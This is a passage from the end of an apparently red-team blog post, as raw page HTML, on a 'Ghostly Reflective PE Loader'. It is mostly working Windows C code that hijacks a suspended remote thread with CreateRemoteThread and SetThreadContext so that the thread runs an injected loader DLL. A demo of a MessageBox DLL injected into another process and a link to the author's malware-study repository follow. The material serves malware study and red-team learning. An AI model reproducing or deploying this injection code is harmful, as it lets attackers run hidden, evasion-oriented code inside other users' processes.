(dllLoaderInTargetAddressOfLoadFunction == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br> <span class="hljs-comment">/*<br> Execute Loader DLL's Load() function<br> <br> For injecting locally, create new local thread<br> For injecting remotely, hijack remote process's worker thread<br> */</span><br> <span class="hljs-keyword">if</span> (injectLocal) {<br>  DWORD threadId = <span class="hljs-literal">NULL</span>;<br>  hTargetThread = <span class="hljs-built_in">CreateThread</span>(<br>   <span class="hljs-literal">NULL</span>,<br>   <span class="hljs-number">0</span>,<br>   (LPTHREAD_START_ROUTINE)dllLoaderInTargetAddressOfLoadFunction,<br>   <span class="hljs-literal">NULL</span>,<br>   CREATE_SUSPENDED,<br>   &amp;threadId<br>  );<br>  <span class="hljs-keyword">if</span> (hTargetThread == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">goto</span> CLEANUP;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Local thread %d created for Target DLL execution, start address: 0x%p\n"</span>, threadId, dllLoaderInTargetAddressOfLoadFunction);<br> }<br> <span class="hljs-keyword">else</span> {<br>  DWORD threadId = <span class="hljs-literal">NULL</span>;<br>  hTargetThread = <span class="hljs-built_in">CreateRemoteThread</span>(<br>   hTargetProcess,<br>   <span class="hljs-literal">NULL</span>,<br>   <span class="hljs-number">0</span>,<br>   (LPTHREAD_START_ROUTINE)dllLoaderInTargetAddressOfLoadFunction,<br>   <span class="hljs-literal">NULL</span>,<br>   CREATE_SUSPENDED,<br>   &amp;threadId<br>  );<br>  <span class="hljs-keyword">if</span> (hTargetThread == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">goto</span> CLEANUP;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Remote thread %d created for Target DLL execution, start address: 0x%p\n"</span>, threadId, dllLoaderInTargetAddressOfLoadFunction);<br> }<br> <span class="hljs-keyword">if</span> (hTargetThread == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">goto</span> CLEANUP;<br><br> <span class="hljs-comment">// Get target thread context</span><br> CONTEXT targetThreadContext;<br> <span class="hljs-built_in">RtlZeroMemory</span>(&amp;targetThreadContext, <span class="hljs-built_in">sizeof</span>(CONTEXT));<br> targetThreadContext.ContextFlags = CONTEXT_ALL;<br> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetThreadContext</span>(hTargetThread, &amp;targetThreadContext)) <span class="hljs-keyword">goto</span> CLEANUP;<br><br> <span class="hljs-comment">// Patch target thread's RIP to point to Entry point</span><br> targetThreadContext.Rip = (DWORD64)dllLoaderInTargetAddressOfLoadFunction;<br> targetThreadContext.Rcx = (DWORD64)targetPESectionNameAddress;<br> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">SetThreadContext</span>(hTargetThread, &amp;targetThreadContext)) <span class="hljs-keyword">goto</span> CLEANUP;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Target thread's RIP set to 0x%p (start address)\n"</span>, dllLoaderInTargetAddressOfLoadFunction);<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Target thread's RCX set to 0x%p (first param; address of section name for Target DLL)\n"</span>, targetPESectionNameAddress);<br><br> <span class="hljs-comment">// Resume process</span><br> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ResumeThread</span>(hTargetThread) == <span class="hljs-number">-1</span>) <span class="hljs-keyword">goto</span> CLEANUP;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Target thread resumed\n"</span>);<br><br> <span class="hljs-comment">// Wait for target thread to finish</span><br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Waiting for target thread to finish\n"</span>);<br> <span class="hljs-built_in">WaitForSingleObject</span>(hTargetThread, INFINITE);<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Target thread finished\n"</span>);<br><br> isSuccess = <span class="hljs-literal">true</span>;<br><br>CLEANUP:<br> <span class="hljs-keyword">if</span> (!injectLocal &amp;&amp; pProcessAll != <span class="hljs-literal">NULL</span>)<br>  <span class="hljs-built_in">HeapFree</span>(<span class="hljs-built_in">GetProcessHeap</span>(), <span class="hljs-number">0</span>, pProcessAll);<br><br> <span class="hljs-keyword">if</span> (hTargetThread != <span class="hljs-literal">NULL</span>) <span class="hljs-built_in">CloseHandle</span>(hTargetThread);<br><br> <span class="hljs-keyword">return</span> isSuccess;<br>}</span></pre><h2 id="fb82" class="ok ol hl bg om on oo op oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph bl" data-selectable-paragraph="">Demo</h2><figure class="qr qs qt qu qv nc mu mv paragraph-image"><div role="button" tabindex="0" class="nd ne fr nf bi ng"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="mu mv re"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*L0qCs3WEQZGPw_SpYW3hIA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*L0qCs3WEQZGPw_SpYW3hIA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*L0qCs3WEQZGPw_SpYW3hIA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*L0qCs3WEQZGPw_SpYW3hIA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*L0qCs3WEQZGPw_SpYW3hIA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*L0qCs3WEQZGPw_SpYW3hIA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L0qCs3WEQZGPw_SpYW3hIA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*L0qCs3WEQZGPw_SpYW3hIA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*L0qCs3WEQZGPw_SpYW3hIA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*L0qCs3WEQZGPw_SpYW3hIA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*L0qCs3WEQZGPw_SpYW3hIA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*L0qCs3WEQZGPw_SpYW3hIA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*L0qCs3WEQZGPw_SpYW3hIA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*L0qCs3WEQZGPw_SpYW3hIA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb nh c" width="700" height="265" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*L0qCs3WEQZGPw_SpYW3hIA.png"></picture></div></div><figcaption class="ni fm nj mu mv nk nl bg b bh ab eb" data-selectable-paragraph="">Using Reflective Ghostly PE injection to inject a Messagebox DLL in remote process</figcaption></figure><p id="8efc" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">And there you go — it works. It took me 3 days to write everything, troubleshoot the underlying issues, understand why certain things did not work, then finding workarounds.</p><h2 id="0fa7" class="ok ol hl bg om on oo op oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph bl" data-selectable-paragraph="">Full code</h2><p id="b5ce" class="pw-post-body-paragraph nm nn hl no b np px nr ns nt py nv nw nx pz nz oa ob qa od oe of qb oh oi oj he bl" data-selectable-paragraph="">Here’s the full project.</p><div class="rf rg rh ri rj rk"><a href="https://github.com/captain-woof/malware-study/tree/main/Ghostly%20Reflective%20PE%20Loader?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="rl ac cb"><div class="rm ac cv ci cd rn"><h2 class="bg hm ro ab ga rp rq rr rs rt ru hk bl">malware-study/Ghostly Reflective PE Loader at main · captain-woof/malware-study</h2><div class="rv m"><h3 class="bg b ro ab ga rp rq rr rs rt ru eb">My projects to understand malware development and detection. Use responsibly. I'm not responsible if you cause…</h3></div><div class="rw m"><p class="bg b ec ab ga rp rq rr rs rt ru eb">github.com</p></div></div><div class="rx m"><div class="xn m rz sa sb rx sc mb rk"></div></div></div></a></div><p id="a937" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">Release builds will include standard C and C++ libraries for the Loader DLL, and certain things will break. You must remove them yourself. To test it out as is, use Debug build.</p><p id="37ac" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">To help in debugging, <code class="de ql qm qn qo b">TestDLL</code> and <code class="de ql qm qn qo b">TestEXE</code> work as Target PEs. Inject either to see it in action. It pops a Messagebox. Further, <code class="de ql qm qn qo b">TestTargetProcess</code> runs indefinitely allowing <code class="de ql qm qn qo b">Injector</code> to work with it. In Startup projects, select both this and Injector, making sure Injector starts after TestTargetProcess.</p><h2 id="2d42" class="ok ol hl bg om on oo op oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph bl" data-selectable-paragraph="">References</h2><ul class=""><li id="2be3" class="nm nn hl no b np px nr ns nt py nv nw nx pz nz oa ob qa od oe of qb oh oi oj qc qd qe bl" data-selectable-paragraph=""><a class="ah qf" href="https://ntdoc.m417z.com/" rel="noopener ugc nofollow" target="_blank">https://ntdoc.m417z.com/</a> <em class="sd">{I LOVE THIS}</em></li><li id="8a9f" class="nm nn hl no b np qg nr ns nt qh nv nw nx qi nz oa ob qj od oe of qk oh oi oj qc qd qe bl" data-selectable-paragraph=""><a class="ah qf" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views" rel="noopener ugc nofollow" target="_blank">https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views</a></li></ul></div></div></div></div></section></div></div></article></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="se sf ac ji"><div class="rv ac"><a class="sg ak ao aq" href="https://medium.com/tag/malware?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><div class="sh fr de si gv sj sk bg b bh ab bl gc">Malware</div></a></div><div class="rv ac"><a class="sg ak ao aq" href="https://medium.com/tag/windows?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><div class="sh fr de si gv sj sk bg b bh ab bl gc">Windows</div></a></div><div class="rv ac"><a class="sg ak ao aq" href="https://medium.com/tag/red-team?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><div class="sh fr de si gv sj sk bg b bh ab bl gc">Red Team</div></a></div><div class="rv ac"><a class="sg ak ao aq" href="https://medium.com/tag/penetration-testing?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><div class="sh fr de si gv sj sk bg b bh ab bl gc">Penetration Testing</div></a></div><div class="rv ac"><a class="sg ak ao aq" href="https://medium.com/tag/windows-internals?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><div class="sh fr de si gv sj sk bg b bh ab bl gc">Windows Internals</div></a></div></div></div></div><div class="m"></div><div class="ta m"><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac iv it ir tb tc"><div class="td te tf tg th ti tj tk tl tm ac cw"><div class="i l"><a tabindex="0" rel="noopener follow" href="https://captain-woof.medium.com/?source=post_page---post_author_info--3b65f2083de0---------------------------------------" data-discover="true"><div class="m fr"><img alt="Sohail Saha" class="m fk by tn to de" width="48" height="48" loading="lazy" src="https://miro.medium.com/v2/resize:fill:48:48/1*tAvZqv2EzW4YT6yFzKJnEw.jpeg"><div class="gj by m tn to fw o ak tp"></div></div></a></div><div class="k j e"><a tabindex="0" rel="noopener follow" href="https://captain-woof.medium.com/?source=post_page---post_author_info--3b65f2083de0---------------------------------------" data-discover="true"><div class="m fr"><img alt="Sohail Saha" class="m fk by tq tr de" width="64" height="64" loading="lazy" src="https://miro.medium.com/v2/resize:fill:64:64/1*tAvZqv2EzW4YT6yFzKJnEw.jpeg"><div class="gj by m tq tr fw o ak tp"></div></div></a></div><div class="k j e ts cb"><div class="ac"></div></div></div><div class="ac cv cd"><div class="tt tu tv tw tx m"><a class="ah ai aj al am an ao ap aq ar as at au av ac r" rel="noopener follow" href="https://captain-woof.medium.com/?source=post_page---post_author_info--3b65f2083de0---------------------------------------" data-discover="true"><h2 class="pw-author-name bg tz ua ub uc ud ue uf nx po pp ob pr ps of pu pv bl"><span class="he ty">Written by Sohail Saha</span></h2></a><div class="rv ac ix"><div class="m cb"><span class="pw-follower-count bg b bh ab eb"><a class="ah ai aj fo al am an ao ap aq ar as at jg" rel="noopener follow" href="https://captain-woof.medium.com/followers?source=post_page---post_author_info--3b65f2083de0---------------------------------------" data-discover="true">143 followers</a></span></div><div class="bg b bh ab eb ac ug"><span class="uh m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span><a class="ah ai aj fo al am an ao ap aq ar as at jg" rel="noopener follow" href="https://captain-woof.medium.com/following?source=post_page---post_author_info--3b65f2083de0---------------------------------------" data-discover="true">0 following</a></div></div><div class="ui m"><p class="bg b bh ab bl"><span class="he">Cybersec noob</span></p></div></div></div><div class="i l"><div class="ac"></div></div></div></div></div></div><div class="uj uk ul um un m"><div class="uo bi s ta"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac r cw"><h2 class="bg tz on op oq or ot ou ov ox oy oz pb pc pd pf pg bl">Responses (1)</h2><div class="ac up"><div><div class="bn" aria-describedby="15" aria-labelledby="15" role="tooltip"><div tabindex="-1" class="bf"><a class="uq ur" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--3b65f2083de0---------------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" aria-label="Shield with a checkmark" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div></div><div class="us ut uu uv uw ux uy m"><div><div class="bg b bh ab bl"><div class="yp"><div class="yx m"><div class="yy ac r"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak tp"></div></div><div class="bo ac cu cv ci"><p class="bg b bh ab eb">Write a response</p></div></div><div class="de bq ac cv yq yr"><div class="ac cv fr"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0&amp;source=---post_responses--3b65f2083de0---------------------respond_sidebar------------------" rel="noopener follow"><div class="ws m"><p class="bg b bh ab eb">What are your thoughts?</p></div></a></span><div class="cw ys eb ac yt xt yu"><span class="bg b bh ab eb"><div class="ac"><div><div class="bn" aria-describedby="28" aria-labelledby="28" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Bold (⌘B)" class="yz za zb zc bq lv ci zd ze zf" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M10.308 17.993h-5.92l.11-.894.783-.12c.56-.11.79-.224.79-.448V5.37c0-.225-.113-.336-.902-.448H4.5l-.114-.894h6.255c4.02 0 5.58 1.23 5.58 3.13 0 1.896-1.78 3.125-3.79 3.463v.11c2.69.34 4.25 1.56 4.25 3.57 0 2.35-2.01 3.69-6.37 3.69l.02.01h-.02zm-.335-12.96H8.967V10.5h1.23c1.788 0 2.79-1.23 2.79-2.683 0-1.685-1.004-2.803-3.006-2.803v.02zm-.223 6.36h-.783v5.588l1.225.23h.22c1.67 0 3.01-1.004 3.01-2.792 0-2.122-1.566-3.016-3.69-3.016h.018z"></path></svg></span></div></div></div><div><div class="bn" aria-describedby="29" aria-labelledby="29" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Italic (⌘I)" class="yz za zb zc bq lv ci zd ze zf" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M9.847 18.04c-.533 0-2.027-.64-1.92-.853l2.027-7.68-.64-.214-1.387 1.494-.427-.427c.534-1.173 1.707-2.667 2.774-2.667.533 0 2.24.534 2.133.854l-2.133 7.786.533.214 1.6-1.067.427.427c-.64 1.066-1.92 2.133-2.987 2.133m2.347-11.733c-.96 0-1.387-.64-1.387-1.387 0-1.067.747-1.92 1.493-1.92.854 0 1.387.64 1.387 1.493-.107 1.067-.747 1.814-1.493 1.814"></path></svg></span></div></div></div></div></span><div class="yv ts ac yt xt yu"><div class="yw"><button class="bg b ec ab bl zg va vb vc lu lr vd fc fd fe ve vf vg fh fi fj fk bn fl fm" data-testid="CancelResponseButton">Cancel</button></div><button class="bg b ec ab xf zg xg xh xi xj vd fc fd xk xl xm fh fi fj fk bn fl fm" disabled="" data-testid="ResponseRespondButton">Respond</button></div></div></div></div></div></div></div></div></div><div class="uz m"><button class="bg b bh ab bl sh va vb vc lu lr vd fc fd fe ve vf vg fh vh vi vj vk vl fi fj fk bn fl fm">See all responses</button></div></div></div></div><div class="vm vn vo vp vq m bx"><div class="i l k"><div class="uo bi vr vs"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="vt ac kr ji"><div class="vu vv m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://help.medium.com/hc/en-us?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Help</p></a></div><div class="vu vv m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://status.medium.com/?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Status</p></a></div><div class="vu vv m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/about?autoplay=1&amp;source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">About</p></a></div><div class="vu vv m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Careers</p></a></div><div class="vu vv m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="mailto:pressinquiries@medium.com" rel="noopener follow"><p class="bg b ec ab eb">Press</p></a></div><div class="vu vv m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://blog.medium.com/?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Blog</p></a></div><div class="vu vv m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Privacy</p></a></div><div class="vu vv m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Rules</p></a></div><div class="vu vv m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Terms</p></a></div><div class="vu m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://speechify.com/medium?source=post_page-----3b65f2083de0---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Text to speech</p></a></div></div></div></div></div></div></div></div></div></div></div></div>





































<div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><div title="reCAPTCHA" width="256" height="60" role="presentation" name="a-w7f722moxvbc" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="cid:frame-33F83C4F0EA88235C1C9085B6DBD930F@mhtml.blink" data-original-tag="iframe"></div></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div></body></html>